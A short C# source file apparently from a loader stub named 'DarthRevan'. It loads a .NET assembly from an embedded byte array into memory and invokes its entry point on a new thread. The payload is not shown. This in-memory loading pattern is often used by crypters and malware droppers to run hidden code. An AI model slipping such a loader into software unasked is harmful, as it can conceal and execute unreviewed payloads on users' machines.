using System;
using System.Reflection;
using System.Threading;

namespace DarthRevan;

public class Threading
{
	public static void Invoker()
	{
		Thread thread = new Thread((ThreadStart)delegate
		{
			MethodInfo entryPoint = AppDomain.CurrentDomain.Load(DataContainer.Data).EntryPoint;
			entryPoint.Invoke(null, null);
		});
		thread.SetApartmentState(ApartmentState.STA);
		thread.Start();
	}
}
